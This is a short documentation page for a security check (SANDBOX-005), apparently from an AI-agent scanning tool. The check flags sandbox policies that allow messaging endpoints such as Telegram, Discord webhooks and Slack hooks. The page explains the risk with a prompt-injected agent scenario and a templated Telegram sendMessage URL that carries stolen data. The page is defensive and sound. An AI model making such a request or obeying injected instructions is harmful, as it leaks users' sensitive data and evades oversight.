# Data Exfiltration Endpoint in Sandbox Policy

**Check:** SANDBOX-005 | **Severity:** High | **Auto-Fix:** No

A sandbox network policy includes `api.telegram.org` in the allowed endpoints list. Telegram's Bot API allows sending arbitrary data to any chat, making it a common exfiltration channel for compromised agents.

## How an Attacker Exploits It

A prompt-injected agent can call `https://api.telegram.org/bot<token>/sendMessage?chat_id=<id>&text=<stolen_data>` to exfiltrate sensitive information. Since the sandbox allows this endpoint, the request succeeds without triggering any network policy violation.

## Which HMA Check Detects It

SANDBOX-005 scans sandbox configuration files (YAML, JSON) for known data exfiltration endpoints in allowed/permitted network lists, including `api.telegram.org`, `discord.com/api/webhooks`, `hooks.slack.com`, and similar services.

## How to Fix It

- Remove messaging service APIs from allowed endpoint lists
- Use a strict allowlist that only includes endpoints required for the agent's core function
- Monitor and log all outbound network requests from sandboxed agents
- Implement egress filtering at the network level as defense in depth

**Detect:** `npx hackmyagent secure vulnerable/`

**References:**
- [CWE-183: Permissive List of Allowed Inputs](https://cwe.mitre.org/data/definitions/183.html)
